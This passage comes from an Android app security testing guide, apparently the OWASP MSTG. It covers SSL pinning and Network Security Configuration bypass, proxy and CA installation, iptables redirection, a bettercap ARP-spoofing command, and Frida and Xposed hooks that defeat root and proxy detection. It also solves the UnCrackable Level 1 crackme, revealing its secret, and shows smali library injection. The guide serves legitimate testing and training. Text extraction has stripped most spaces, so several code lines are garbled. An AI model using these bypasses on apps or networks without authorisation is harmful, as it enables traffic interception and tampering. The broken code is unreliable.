Here’sanexampleoftheoutput: 127\nFigure 1: objection Android SSL Pinning Bypass See also Objection’s help on Disabling SSL Pinning for Android for further information and inspect the pinning.ts file to understandhowthebypassworks. Bypass Custom Certificate Pinning Statically Somewhereintheapplication,boththeendpointandthecertificate(oritshash)mustbedefined. Afterdecompilingthe application,youcansearchfor: • Certificatehashes: grep-ri"sha256\|sha1"./smali. Replacetheidentifiedhasheswiththehashofyourproxy’s CA.Alternatively,ifthehashisaccompaniedbyadomainname,youcantrymodifyingthedomainnametoanon- existingdomainsothattheoriginaldomainisnotpinned. ThisworkswellonobfuscatedOkHTTPimplementations. • Certificatefiles: find ./assets -type f \( -iname \*.cer -o -iname \*.crt \). Replacethesefileswithyour proxy’scertificates,makingsuretheyareinthecorrectformat. • Truststore files: find ./ -type f \( -iname \*.jks -o -iname \*.bks \). Add your proxy’s certificates to the truststoreandmakesuretheyareinthecorrectformat. Keep in mind that an app might contain files without extension. The most common file locations areassets and resdirectories,whichshouldalsobeinvestigated. As an example, let’s say that you find an application which uses a BKS (BouncyCastle) truststore and it’s stored in the file res/raw/truststore.bks. To bypass SSL Pinning you need to add your proxy’s certificate to the truststore with thecommandlinetoolkeytool. KeytoolcomeswiththeJavaSDKandthefollowingvaluesareneededtoexecutethe command: • password-Passwordforthekeystore. Lookinthedecompiledappcodeforthehardcodedpassword. • providerpath-LocationoftheBouncyCastleProviderjarfile. YoucandownloaditfromTheLegionoftheBouncy Castle. • proxy.cer-Yourproxy’scertificate. • aliascert-Uniquevaluewhichwillbeusedasaliasforyourproxy’scertificate. Toaddyourproxy’scertificateusethefollowingcommand: keytool -importcert -v-trustcacerts -file proxy.cer -alias aliascert -keystore "res/raw/truststore.bks" -provider ↪ org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath "providerpath/bcprov-jdk15on-164.jar" -storetype BKS-storepass password TolistcertificatesintheBKStruststoreusethefollowingcommand: 128\nkeytool-list-keystore"res/raw/truststore.bks"-providerorg.bouncycastle.jce.provider.BouncyCastleProvider-providerpath"providerpath/bcprov-jdk15on-164.jar" ↪ -storetype BKS-storepass password Aftermakingthesemodifications,repackagetheapplicationusingapktoolandinstallitonyourdevice. Iftheapplicationusesnativelibrariestoimplementnetworkcommunication,furtherreverseengineeringisneeded. An exampleofsuchanapproachcanbefoundintheblogpostIdentifyingtheSSLPinninglogicinsmalicode, patchingit, andreassemblingtheAPK Bypass Custom Certificate Pinning Dynamically Bypassingthepinninglogicdynamicallymakesitmoreconvenientasthereisnoneedtobypassanyintegritychecksand it’smuchfastertoperformtrial&errorattempts. Finding the correct method to hook is typically the hardest part and can take quite some time depending on the level of obfuscation. As developers typically reuse existing libraries, it is a good approach to search for strings and license filesthatidentifytheusedlibrary. Oncethelibraryhasbeenidentified,examinethenon-obfuscatedsourcecodetofind methodswhicharesuitedfordynamicinstrumentation. As an example, let’s say that you find an application which uses an obfuscated OkHTTP3 library. The documentation showsthattheCertificatePinner.Builderclassisresponsibleforaddingpinsforspecificdomains. Ifyoucanmodify theargumentstotheBuilder.addmethod,youcanchangethehashestothecorrecthashesbelongingtoyourcertificate. Findingthecorrectmethodcanbedoneineithertwoways,asexplainedinthisblogpostbyJeroenBeckers: • Searchforhashesanddomainnamesasexplainedintheprevioussection. Theactualpinningmethodwilltypically beusedordefinedincloseproximitytothesestrings • SearchforthemethodsignatureintheSMALIcode FortheBuilder.addmethod,youcanfindthepossiblemethodsbyrunningthefollowinggrepcommand: grep -ri java/ lang/String;\[Ljava/lang/String;)L ./ This command will search for all methods that take a string and a variable list of strings as arguments, and return a complexobject. Dependingonthesizeoftheapplication,thismayhaveoneormultiplematchesinthecode. HookeachmethodwithFridaandprintthearguments. Oneofthemwillprintoutadomainnameandacertificatehash, afterwhichyoucanmodifytheargumentstocircumventtheimplementedpinning. Setting Up an Interception Proxy Platform: android SeveraltoolssupportthenetworkanalysisofapplicationsthatrelyontheHTTP(S)protocol. Themostimportanttoolsare theso-calledinterceptionproxies; OWASPZAPandBurpSuiteProfessionalarethemostfamous. Aninterceptionproxy givesthetesteraman-in-the-middleposition. Thispositionisusefulforreadingand/ormodifyingallapprequestsand endpointresponses,whichareusedfortestingAuthorization,Session,Management,etc. Interception Proxy for a Virtual Device Setting Up a Web Proxy on an Android Virtual Device (AVD) Thefollowingprocedure,whichworksontheAndroidemulatorthatshipswithAndroidStudio3.x,isforsettingupanHTTP proxyontheemulator: 1. Setupyourproxytolistenonlocalhostandforexampleport8080. 2. ConfiguretheHTTPproxyintheemulatorsettings: • Clickonthethreedotsintheemulatormenubar • OpentheSettingsMenu • ClickontheProxytab 129\n• SelectManualproxyconfiguration • Enter“127.0.0.1”intheHostNamefieldandyourproxyportinthePortnumberfield(e.g.,“8080”) • TapApply HTTPandHTTPSrequestsshouldnowberoutedovertheproxyonthehostcomputer. Ifnot,trytogglingairplanemode offandon. AproxyforanAVDcanalsobeconfiguredonthecommandlinebyusingtheemulatorcommandwhenstartinganAVD. ThefollowingexamplestartstheAVDNexus_5X_API_23andsetsaproxyto127.0.0.1andport8080. emulator@Nexus_5X_API_23 -http-proxy 127.0.0.1:8080 Installing a CA Certificate on the Virtual Device AneasywaytoinstallaCAcertificateistopushthecertificatetothedeviceandaddittothecertificatestoreviaSecurity Settings. Forexample,youcaninstallthePortSwigger(Burp)CAcertificateasfollows: 1. StartBurpanduseawebbrowseronthehosttonavigatetoburp/,thendownloadcacert.derbyclickingthe“CA Certificate”button. 2. Changethefileextensionfrom.derto.cer. 3. Pushthefiletotheemulator: adbpush cacert.cer/sdcard/ 4. NavigatetoSettings->Security->InstallfromSDCard. 5. Scrolldownandtapcacert.cer. Youshouldthenbepromptedtoconfirminstallationofthecertificate(you’llalsobeaskedtosetadevicePINifyouhaven’t already). Thisinstallsthecertificateintheusercertificatestore(testedonGenymotionVM).Inordertoplacethecertificateinthe rootstoreyoucanperformthefollowingsteps: 1. Runadbasrootwithadb rootandadb shell. 2. Locatethenewlyinstalledcertificateat/data/misc/user/0/cacerts-added/. 3. Copythecertificatetothefollowingfolder/system/etc/security/cacerts/. 4. ReboottheAndroidVM. 130\nFor Android 7.0 (API level 24) and above follow the same procedure described in the “Bypassing the Network Security Configuration”section. Interception Proxy for a Physical Device Theavailablenetworksetupoptionsmustbeevaluatedfirst. Themobiledeviceusedfortestingandthehostcomputer running the interception proxy must be connected to the same Wi-Fi network. Use either an (existing) access point or createanad-hocwirelessnetwork. Once you’ve configured the network and established a connection between the testing host computer and the mobile device,severalstepsremain. • Theproxymustbeconfiguredtopointtotheinterceptionproxy. • Theinterceptionproxy’sCAcertificatemustbeaddedtothetrustedcertificatesintheAndroiddevice’scertificate storage. ThelocationofthemenuusedtostoreCAcertificatesmaydependontheAndroidversionandAndroid OEMmodificationsofthesettingsmenu. • Someapplication(e.g.theChromebrowser)mayshowNET::ERR_CERT_VALIDITY_TOO_LONGerrors,iftheleafcer- tificate happens to have a validity extending a certain time (39 months in case of Chrome). This happens if the defaultBurpCAcertificateisused,sincetheBurpSuiteissuesleafcertificateswiththesamevalidityasitsCAcer- tificate. YoucancircumventthisbycreatingyourownCAcertificateandimportittotheBurpSuite,asexplained inthisblogpost. Aftercompletingthesestepsandstartingtheapp,therequestsshouldshowupintheinterceptionproxy. AvideoofsettingupOWASPZAPwithanAndroiddevicecanbefoundonsecure.force.com. Afewotherdifferences: fromAndroid8.0(APIlevel26)onward,thenetworkbehavioroftheappchangeswhenHTTPS trafficistunneledthroughanotherconnection. AndfromAndroid9(APIlevel28)onward,theSSLSocketandSSLEngine willbehavealittlebitdifferentintermsoferrorhandlingwhensomethinggoeswrongduringthehandshakes. As mentioned before, starting with Android 7.0 (API level 24), the Android OS will no longer trust user CA certificates bydefault, unlessspecifiedintheapplication. Inthefollowingsection, weexplaintwomethodstobypassthisAndroid securitycontrol. Bypassing the Network Security Configuration InthissectionwewillpresentseveralmethodstobypassAndroid’sNetworkSecurityConfiguration. Adding Custom User Certificates to the Network Security Configuration TherearedifferentconfigurationsavailablefortheNetworkSecurityConfigurationtoaddnon-systemCertificateAuthori- tiesviathesrcattribute: <certificates src=["system" |"user"|"raw resource"] overridePins=["true" |"false"]/> Eachcertificatecanbeoneofthefollowing: • "raw resource"isanIDpointingtoafilecontainingX.509certificates • "system"forthepre-installedsystemCAcertificates • "user"foruser-addedCAcertificates The CA certificates trusted by the app can be a system trusted CA as well as a user CA. Usually you will have added the certificate of your interception proxy already as additional CA in Android. Therefore we will focus on the “user” setting,whichallowsyoutoforcetheAndroidapptotrustthiscertificatewiththefollowingNetworkSecurityConfiguration below: 131\n<network-security-config> <base-config> <trust-anchors> <certificates src="system" /> <certificates src="user" /> </trust-anchors> </base-config> </network-security-config> Toimplementthisnewsettingyoumustfollowthestepsbelow: • Decompiletheappusingadecompilationtoollikeapktool: apktoold <filename>.apk • MaketheapplicationtrustusercertificatesbycreatingaNetworkSecurityConfigurationthatincludes<certifi- cates src="user" />asexplainedabove • Gointothedirectorycreatedbyapktoolwhendecompilingtheappandrebuildtheappusingapktool. Thenewapk willbeinthedistdirectory. apktoolb • Youneedtorepackagetheapp, asexplainedinthe“Repackaging”sectionofthe“ReverseEngineeringandTam- pering”chapter. FormoredetailsontherepackagingprocessyoucanalsoconsulttheAndroiddeveloperdocumen- tation,thatexplainstheprocessasawhole. Notethatevenifthismethodisquitesimpleitsmajordrawbackisthatyouhavetoapplythisoperationforeachapplication youwanttoevaluatewhichisadditionaloverheadfortesting. Bearinmindthatiftheappyouaretestinghasadditionalhardeningmeasures,likeverificationoftheappsignature youmightnotbeabletostarttheappanymore. Aspartoftherepackagingyouwillsigntheappwithyourownkey andthereforethesignaturechangeswillresultintriggeringsuchchecksthatmightleadtoimmediatetermination oftheapp. Youwouldneedtoidentifyanddisablesuchcheckseitherbypatchingthemduringrepackagingofthe appordynamicinstrumentationthroughFrida. ThereisapythonscriptavailablethatautomatesthestepsdescribedabovecalledAndroid-CertKiller. ThisPythonscript canextracttheAPKfromaninstalledAndroidapp,decompileit,makeitdebuggable,addanewNetworkSecurityConfig- urationthatallowsusercertificates,buildsandsignsthenewAPKandinstallsthenewAPKwiththeSSLBypass. pythonmain.py -w *************************************** AndroidCertKiller (v0.1) *************************************** CertKillerWizardMode --------------------------------- Listofdevicesattached 4200dc72f27bc44d device --------------------------------- EnterApplicationPackageName:nsc.android.mstg.owasp.org.android_nsc Package:/data/app/nsc.android.mstg.owasp.org.android_nsc-1/base.apk I.InitiatingAPKextractionfromdevice complete ------------------------------ I.Decompiling complete ------------------------------ I.ApplyingSSLbypass complete ------------------------------ I.BuildingNewAPK complete ------------------------------ I.SigningAPK complete ------------------------------ WouldyouliketoinstalltheAPKonyourdevice(y/N):y ------------------------------------ InstallingUnpinnedAPK ------------------------------ Finished 132\nAdding the Proxy’s certificate among system trusted CAs using Magisk InordertoavoidtheobligationofconfiguringtheNetworkSecurityConfigurationforeachapplication,wemustforcethe devicetoaccepttheproxy’scertificateasoneofthesystemstrustedcertificates. ThereisaMagiskmodulethatwillautomaticallyaddalluser-installedCAcertificatestothelistofsystemtrustedCAs. DownloadthelatestversionofthemoduleattheGithubReleasepage,pushthedownloadedfileovertothedeviceand import it in the Magisk Manager’s “Module” view by clicking on the + button. Finally, a restart is required by Magisk Managertoletchangestakeeffect. Fromnowon,anyCAcertificatethatisinstalledbytheuservia“Settings”,“Security&location”,“Encryption&creden- tials”, “Install from storage” (location may differ) is automatically pushed into the system’s trust store by this Magisk module. RebootandverifythattheCAcertificateislistedin“Settings”,“Security&location”,“Encryption&credentials”, “Trustedcredentials”(locationmaydiffer). Manually adding the Proxy’s certificate among system trusted CAs Alternatively,youcanfollowthefollowingstepsmanuallyinordertoachievethesameresult: • Makethe/systempartitionwritable,whichisonlypossibleonarooteddevice. Runthe‘mount’commandtomake sure the /system is writable: mount -o rw,remount /system. If this command fails, try running the following commandmount -o rw,remount -t ext4 /system • Preparetheproxy’sCAcertificatestomatchsystemcertificatesformat. Exporttheproxy’scertificatesinderformat (thisisthedefaultformatinBurpSuite)thenrunthefollowingcommands: $openssl x509 -inform DER-incacert.der -out cacert.pem $openssl x509 -inform PEM-subject_hash_old -incacert.pem |head -1 mvcacert.pem <hash>.0 • Finally,copythe<hash>.0fileintothedirectory/system/etc/security/cacertsandthenrunthefollowingcommand: chmod 644<hash>.0 By following the steps described above you allow any application to trust the proxy’s certificate, which allows you to interceptitstraffic,unlessofcoursetheapplicationusesSSLpinning. Potential Obstacles Applicationsoftenimplementsecuritycontrolsthatmakeitmoredifficulttoperformasecurityreviewoftheapplication, suchasrootdetectionandcertificatepinning. Ideally,youwouldacquirebothaversionoftheapplicationthathasthese controlsenabled,andonewherethecontrolsaredisabled. Thisallowsyoutoanalyzetheproperimplementationofthe controls,afterwhichyoucancontinuewiththeless-secureversionforfurthertests. Of course, this is not always possible, and you may need to perform a black-box assessment on an application where allsecuritycontrolsareenabled. Thesectionbelowshowsyouhowyoucancircumventcertificatepinningfordifferent applications. Client Isolation in Wireless Networks Onceyou have setup an interceptionproxyandhave a MITM position you mightstill not be able to seeanything. This mightbeduetorestrictionsintheapp(seenextsection)butcanalsobeduetosocalledclientisolationintheWi-Fithat youareconnectedto. WirelessClientIsolationisasecurityfeaturethatpreventswirelessclientsfromcommunicatingwithoneanother. This featureisusefulforguestandBYODSSIDsaddingalevelofsecuritytolimitattacksandthreatsbetweendevicesconnected tothewirelessnetworks. WhattodoiftheWi-Fiweneedfortestinghasclientisolation? YoucanconfiguretheproxyonyourAndroiddevicetopointto127.0.0.1:8080,connectyourphoneviaUSBtoyourhost computeranduseadbtomakeareverseportforwarding: 133\nadbreversetcp:8080tcp:8080 Once you have done this all proxy traffic on your Android phone will be going to port 8080 on 127.0.0.1 and it will be redirectedviaadbto127.0.0.1:8080onyourhostcomputerandyouwillseenowthetrafficinyourBurp. Withthistrick youareabletotestandintercepttrafficalsoinWi-Fisthathaveclientisolation. Non-Proxy Aware Apps OnceyouhavesetupaninterceptionproxyandhaveaMITMpositionyoumightstillnotbeabletoseeanything. Thisis mainlyduetothefollowingreasons: • TheappisusingaframeworklikeXamarinthatsimplyisnotusingtheproxysettingsoftheAndroidOSor • Theappyouaretestingisverifyingifaproxyissetandisnotallowingnowanycommunication. In both scenarios you would need additional steps to finally being able to see the traffic. In the sections below we are describingtwodifferentsolutions,bettercapandiptables. You could also use an access point that is under your control to redirect the traffic, but this would require additional hardwareandwefocusfornowonsoftwaresolutions. Forbothsolutionsyouneedtoactivate“Supportinvisibleproxying”inBurp,inProxyTab/Options/EditInterface. iptables YoucanuseiptablesontheAndroiddevicetoredirectalltraffictoyourinterceptionproxy. Thefollowingcommandwould redirectport80toyourproxyrunningonport8080 iptables -tnat-AOUTPUT -ptcp--dport 80-jDNAT --to-destination <Your-Proxy-IP>:8080 VerifytheiptablessettingsandchecktheIPandport. $iptables -tnat-L ChainPREROUTING (policyACCEPT) target protoptsource destination ChainINPUT (policyACCEPT) target protoptsource destination ChainOUTPUT (policyACCEPT) target protoptsource destination DNAT tcp -- anywhere anywhere tcpdpt:5288to:<Your-Proxy-IP>:8080 ChainPOSTROUTING (policyACCEPT) target protoptsource destination Chainnatctrl_nat_POSTROUTING (0references) target protoptsource destination Chainoem_nat_pre (0references) target protoptsource destination Incaseyouwanttoresettheiptablesconfigurationyoucanflushtherules: iptables -tnat-F bettercap Readthechapter“TestingNetworkCommunication”andthetestcase“SimulatingaMan-in-the-MiddleAttack”forfurther preparationandinstructionsforrunningbettercap. ThehostcomputerwhereyourunyourproxyandtheAndroiddevicemustbeconnectedtothesamewirelessnetwork. Startbettercapwiththefollowingcommand,replacingtheIPaddressbelow(X.X.X.X)withtheIPaddressofyourAndroid device. 134\n$sudobettercap -eval "setarp.spoof.targetsX.X.X.X;arp.spoofon;setarp.spoof.internaltrue;setarp.spoof.fullduplextrue;" bettercapv2.22 (builtfordarwinamd64withgo1.12.1)[type 'help' foralistofcommands] [19:21:39] [sys.log][inf]arp.spoofenablingforwarding [19:21:39] [sys.log][inf]arp.spoofarpspooferstarted,probing1targets. Proxy Detection Somemobileappsaretryingtodetectifaproxyisset. Ifthat’sthecasetheywillassumethatthisismaliciousandwill notworkproperly. Inordertobypasssuchaprotectionmechanismyoucouldeithersetupbettercaporconfigureiptablesthatdon’tneed aproxysetuponyourAndroidphone. Athirdoptionwedidn’tmentionbeforeandthatisapplicableinthisscenariois usingFrida. ItispossibleonAndroidtodetectifasystemproxyissetbyqueryingtheProxyInfoclassandcheckthe getHost()andgetPort()methods. Theremightbevariousothermethodstoachievethesametaskandyouwouldneed todecompiletheAPKinordertoidentifytheactualclassandmethodname. BelowyoucanfindboilerplatesourcecodeforaFridascriptthatwillhelpyoutooverloadthemethod(inthiscasecalled isProxySet)thatisverifyingifaproxyissetandwillalwaysreturnfalse. Evenifaproxyisnowconfiguredtheappwill nowthinkthatnoneissetasthefunctionreturnsfalse. setTimeout(function(){ Java.perform(function (){ console.log("[*]Scriptloaded") varProxy =Java.use("<package-name>.<class-name>") Proxy.isProxySet.overload().implementation =function(){ console.log("[*]isProxySetfunctioninvoked") return false } }); }); Method Hooking Platform: android Xposed Let’sassumeyou’retestinganappthat’sstubbornlyquittingonyourrooteddevice. Youdecompiletheappandfindthe followinghighlysuspectmethod: package com.example.a.b public static boolean c(){ intv3=0; boolean v0=false; String[]v1=newString[]{"/sbin/","/system/bin/","/system/xbin/","/data/local/xbin/", "/data/local/bin/","/system/sd/xbin/","/system/bin/failsafe/","/data/local/"}; intv2=v1.length; for(intv3=0;v3<v2;v3++){ if(newFile(String.valueOf(v1[v3])+"su").exists()){ v0=true; return v0; } } return v0; } Thismethoditeratesthroughalistofdirectoriesandreturnstrue(devicerooted)ifitfindsthesubinaryinanyofthem. Checkslikethisareeasytodeactivateallyouhavetodoisreplacethecodewithsomethingthatreturns“false”. Method hookingwithanXposedmoduleisonewaytodothis(see“AndroidBasicSecurityTesting”formoredetailsonXposed installationandbasics). 135\nThe method XposedHelpers.findAndHookMethod allows you to override existing class methods. By inspecting the de- compiledsourcecode, youcanfindoutthatthemethodperformingthecheckisc. Thismethodislocatedintheclass com.example.a.b. ThefollowingisanXposedmodulethatoverridesthefunctionsothatitalwaysreturnsfalse: package com.awesome.pentestcompany; import static de.robv.android.xposed.XposedHelpers.findAndHookMethod; import de.robv.android.xposed.IXposedHookLoadPackage; import de.robv.android.xposed.XposedBridge; import de.robv.android.xposed.XC_MethodHook; import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam; public class DisableRootCheck implements IXposedHookLoadPackage { public void handleLoadPackage(final LoadPackageParamlpparam)throws Throwable { if(!lpparam.packageName.equals("com.example.targetapp")) return; findAndHookMethod("com.example.a.b",lpparam.classLoader,"c",newXC_MethodHook(){ @Override protected void beforeHookedMethod(MethodHookParamparam)throws Throwable { XposedBridge.log("Caughtrootcheck!"); param.setResult(false); } }); } } JustlikeregularAndroidapps,modulesforXposedaredevelopedanddeployedwithAndroidStudio. Formoredetailson writing,compiling,andinstallingXposedmodules,refertothetutorialprovidedbyitsauthor,rovo89. Frida We’lluseFridatosolvetheUnCrackableAppforAndroidLevel1anddemonstratehowwecaneasilybypassrootdetection andextractsecretdatafromtheapp. Whenyoustartthecrackmeapponanemulatororarooteddevice,you’llfindthattheitpresentsadialogboxandexits assoonasyoupress“OK”becauseitdetectedroot: 136\nLet’sseehowwecanpreventthis. Themainmethod(decompiledwithCFR)lookslikethis: package sg.vantagepoint.uncrackable1; import android.app.Activity; import android.app.AlertDialog; import android.content.Context; import android.content.DialogInterface; import android.os.Bundle; import android.text.Editable; import android.view.View; import android.widget.EditText; import sg.vantagepoint.a.b; import sg.vantagepoint.a.c; import sg.vantagepoint.uncrackable1.a; public class MainActivity extends Activity { private void a(Stringstring){ AlertDialogalertDialog =newAlertDialog.Builder((Context)this).create(); alertDialog.setTitle((CharSequence)string); alertDialog.setMessage((CharSequence)"Thisisunacceptable.Theappisnowgoingtoexit."); alertDialog.setButton(-3,(CharSequence)"OK",newDialogInterface.OnClickListener(){ public void onClick(DialogInterfacedialogInterface,intn){ System.exit((int)0); } }); alertDialog.setCancelable(false); alertDialog.show(); } protected void onCreate(Bundlebundle){ if(c.a()||c.b()||c.c()){ this.a("Rootdetected!"); } if(b.a(this.getApplicationContext())) { this.a("Appisdebuggable!"); } super.onCreate(bundle); this.setContentView(2130903040); } 137\n/* *Enabledaggressiveblocksorting */ public void verify(Viewobject){ object =((EditText)this.findViewById(2130837505)).getText().toString(); AlertDialogalertDialog =newAlertDialog.Builder((Context)this).create(); if(a.a((String)object)){ alertDialog.setTitle((CharSequence)"Success!"); object ="Thisisthecorrectsecret."; }else { alertDialog.setTitle((CharSequence)"Nope..."); object ="That'snotit.Tryagain."; } alertDialog.setMessage((CharSequence)object); alertDialog.setButton(-3,(CharSequence)"OK",newDialogInterface.OnClickListener(){ public void onClick(DialogInterfacedialogInterface,intn){ dialogInterface.dismiss(); } }); alertDialog.show(); } } Notice the “Root detected” message in the onCreate method and the various methods called in the preceding if- statement(whichperformtheactualrootchecks). Alsonotethe“Thisisunacceptable...”messagefromthefirstmethod oftheclass,privatevoida. Obviously,thismethoddisplaysthedialogbox. ThereisanalertDialog.onClickListener callbacksetinthesetButtonmethodcall,whichclosestheapplicationviaSystem.exitaftersuccessfulrootdetection. WithFrida,youcanpreventtheappfromexitingbyhookingtheMainActivity.amethodorthecallbackinsideit. The examplebelowshowshowyoucanhookMainActivity.aandpreventitfromendingtheapplication. setImmediate(function(){ //preventtimeout console.log("[*]Startingscript"); Java.perform(function(){ varmainActivity =Java.use("sg.vantagepoint.uncrackable1.MainActivity"); mainActivity.a.implementation =function(v){ console.log("[*]MainActivity.acalled"); }; console.log("[*]MainActivity.amodified"); }); }); WrapyourcodeinthefunctionsetImmediatetopreventtimeouts(youmayormaynotneedtodothis),thencallJava. performtouseFrida’smethodsfordealingwithJava. AfterwardsretrieveawrapperforMainActivityclassandoverwrite itsamethod. Unliketheoriginal,thenewversionofajustwritesconsoleoutputanddoesn’texittheapp. Analternative solutionistohookonClickmethodoftheOnClickListenerinterface. YoucanoverwritetheonClickmethodandprevent itfromendingtheapplicationwiththeSystem.exitcall. IfyouwanttoinjectyourownFridascript,itshouldeitherdisable theAlertDialogentirelyorchangethebehavioroftheonClickmethodsotheappdoesnotexitwhenyouclick“OK”. Savetheabovescriptasuncrackable1.jsandloadit: frida -U-fowasp.mstg.uncrackable1 -luncrackable1.js --no-pause Afteryouseethe“MainActivity.amodified”messageandtheappwillnotexitanymore. Youcannowtrytoinputa“secretstring”. Butwheredoyougetit? Ifyoulookattheclasssg.vantagepoint.uncrackable1.a,youcanseetheencryptedstringwithwhichyourinputgets compared: package sg.vantagepoint.uncrackable1; import android.util.Base64; import android.util.Log; public class a{ public static boolean a(Stringstring){ byte[]arrby =Base64.decode((String)"5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=",(int)0); try{ arrby =sg.vantagepoint.a.a.a(a.b("8d127684cbc37c17616d806cf50473cc"),arrby); 138\n} catch (Exceptionexception){ StringBuilderstringBuilder =newStringBuilder(); stringBuilder.append("AESerror:"); stringBuilder.append(exception.getMessage()); Log.d((String)"CodeCheck",(String)stringBuilder.toString()); arrby =newbyte[]{}; } return string.equals((Object)newString(arrby)); } public static byte[]b(Stringstring){ intn=string.length(); byte[]arrby =newbyte[n/2]; for(inti=0;i<n;i+=2){ arrby[i/2]=(byte)((Character.digit((char)string.charAt(i),(int)16)<<4)+Character.digit((char)string.charAt(i+1),(int)16)); } return arrby; } } Lookatthestring.equalscomparisonattheendoftheamethodandthecreationofthestringarrbyinthetryblock above. arrby is the return value of the function sg.vantagepoint.a.a.a. string.equals comparison compares your inputwitharrby. Sowewantthereturnvalueofsg.vantagepoint.a.a.a. Insteadofreversingthedecryptionroutinestoreconstructthesecretkey,youcansimplyignoreallthedecryptionlogic in the app and hook the sg.vantagepoint.a.a.a function to catch its return value. Here is the complete script that preventsexitingonrootandinterceptsthedecryptionofthesecretstring: setImmediate(function(){ //preventtimeout console.log("[*]Startingscript"); Java.perform(function(){ varmainActivity =Java.use("sg.vantagepoint.uncrackable1.MainActivity"); mainActivity.a.implementation =function(v){ console.log("[*]MainActivity.acalled"); }; console.log("[*]MainActivity.amodified"); varaaClass =Java.use("sg.vantagepoint.a.a"); aaClass.a.implementation =function(arg1,arg2){ varretval =this.a(arg1,arg2); varpassword =''; for(vari=0;i<retval.length;i++){ password +=String.fromCharCode(retval[i]); } console.log("[*]Decrypted:" +password); return retval; }; console.log("[*]sg.vantagepoint.a.a.amodified"); }); }); After running the script in Frida and seeing the “[*] sg.vantagepoint.a.a.a modified” message in the console, enter a randomvaluefor“secretstring”andpressverify. Youshouldgetanoutputsimilartothefollowing: $frida -U-fowasp.mstg.uncrackable1 -luncrackable1.js --no-pause [*]Startingscript [USB::AndroidEmulator5554::sg.vantagepoint.uncrackable1]->[*]MainActivity.amodified [*]sg.vantagepoint.a.a.amodified [*]MainActivity.acalled. [*]Decrypted:Iwanttobelieve Thehookedfunctionoutputtedthedecryptedstring. Youextractedthesecretstringwithouthavingtodivetoodeepinto theapplicationcodeanditsdecryptionroutines. You’venowcoveredthebasicsofstatic/dynamicanalysisonAndroid. Ofcourse,theonlywaytoreallylearnitishands-on experience: buildyourownprojectsinAndroidStudio,observehowyourcodegetstranslatedintobytecodeandnative code,andtrytocrackourchallenges. In the remaining sections, we’ll introduce a few advanced subjects, including process exploration, kernel modules and dynamicexecution. 139\nGetting Loaded Classes and Methods Dynamically Platform: android YoucanusethecommandJavaintheFridaCLItoaccesstheJavaruntimeandretrieveinformationfromtherunningapp. Rememberthat,unlikeFridaforiOS,inAndroidyouneedtowrapyourcodeinsideaJava.performfunction. Thus,it’s moreconvenienttouseFridascriptstoe.g.getalistofloadedJavaclassesandtheircorrespondingmethodsandfields orformorecomplexinformationgatheringorinstrumentation. Onesuchscriptsislistedbelow. Thescripttolistclass’s methodsusedbelowisavailableonGithub. //GetlistofloadedJavaclassesandmethods //Filename:java_class_listing.js Java.perform(function(){ Java.enumerateLoadedClasses({ onMatch:function(className){ console.log(className); describeJavaClass(className); }, onComplete:function(){} }); }); //Getthemethodsandfields function describeJavaClass(className){ varjClass =Java.use(className); console.log(JSON.stringify({ _name:className, _methods:Object.getOwnPropertyNames(jClass.__proto__).filter(function(m) { return !m.startsWith('$')//filteroutFridarelatedspecialproperties ||m=='class'||m=='constructor'//optional }), _fields:jClass.class.getFields().map(function(f){ return(f.toString()); }) },null,2)); } Aftersavingthescripttoafilecalledjava_class_listing.js,youcantellFridaCLItoloaditbyusingtheflag-landinjectit totheprocessIDspecifiedby-p. frida -U-ljava_class_listing.js -p<pid> //Output [HuaweiNexus6P::sg.vantagepoint.helloworldjni]-> ... com.scottyab.rootbeer.sample.MainActivity { "_name":"com.scottyab.rootbeer.sample.MainActivity", "_methods":[ ... "beerView", "checkRootImageViewList", "floatingActionButton", "infoDialog", "isRootedText", "isRootedTextDisclaimer", "mActivity", "GITHUB_LINK" ], "_fields":[ "publicstaticfinalintandroid.app.Activity.DEFAULT_KEYS_DIALER", ... Giventheverbosityoftheoutput,thesystemclassescanbefilteredoutprogrammaticallytomakeoutputmorereadable andrelevanttotheusecase. Library Injection Platform: android Intheprevioussectionwelearnedaboutpatchingapplicationcodetoassistinouranalysis,butthisapproachhasseveral limitations. Forinstance,you’dliketologeverythingthat’sbeingsentoverthenetworkwithouthavingtoperformaMITM 140\nattack. Forthis you’dhave topatch allpossible callsto thenetwork APIs, which canquickly becomeimpractical when dealingwithlargeapplications. Inaddition,thefactthatpatchingisuniquetoeachapplicationcanalsobeconsidereda shortcoming,asthiscodecannotbeeasilyreused. Using library injection you can develop reusable libraries and inject them to different applications, effectively making thembehavedifferentlywithouthavingtomodifytheiroriginalsourcecode. ThisisknownasDLLinjectiononWindows (broadlyusedtomodifyandbypassanti-cheatmechanismsingames),LD_PRELOADonLinuxandDYLD_INSERT_LIBRARIES onmacOS.OnAndroidandiOS,acommonexampleisusingtheFridaGadgetwheneverFrida’sso-calledInjectedmode ofoperationisn’tsuitable(i.e.youcannotruntheFridaserveronthetargetdevice). Inthissituation,youcaninjectthe Gadgetlibrarybyusingthesamemethodsyou’regoingtolearninthissection. Libraryinjectionisdesirableinmanysituationssuchas: • Performingprocessintrospection(e.g.listingclasses, tracingmethodcalls, monitoringaccessedfiles, monitoring networkaccess,obtainingdirectmemoryaccess). • Supporting or replacing existing code with your own implementations (e.g. replace a function that should give randomnumbers). • Introducingnewfeaturestoanexistingapplication. • Debuggingandfixingelusiveruntimebugsoncodeforwhichyoudon’thavetheoriginalsource. • Enabledynamictestingonanon-rooteddevice(e.g.withFrida). Inthissection,wewilllearnabouttechniquesforperforminglibraryinjectiononAndroid,whichbasicallyconsistofpatch- ingtheapplicationcode(smaliornative)oralternativelyusingtheLD_PRELOADfeatureprovidedbytheOSloaderitself. Patching the Application’s Smali Code AnAndroidapplication’sdecompiledsmalicodecanbepatchedtointroduceacalltoSystem.loadLibrary. Thefollowing smalipatchinjectsalibrarynamedlibinject.so: const-stringv0,"inject" invoke-static{v0},Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V Ideally you should insert the above code early in the application lifecycle, for instance in the onCreate method. It is importanttoremembertoaddthelibrarylibinject.sointherespectivearchitecturefolder(armeabi-v7a,arm64-v8a,x86) ofthelibfolderintheAPK.Finally,youneedtore-signtheapplicationbeforeusingit. A well-known use case of this technique is loading the Frida gadget to an application, especially while working on a non-rooteddevice(thisiswhatobjection patchapkbasicallydoes). Patching Application’s Native Library Many Androidapplications use native code in addition to Java code for various performance and security reasons. The nativecodeispresentintheformofELFsharedlibraries. 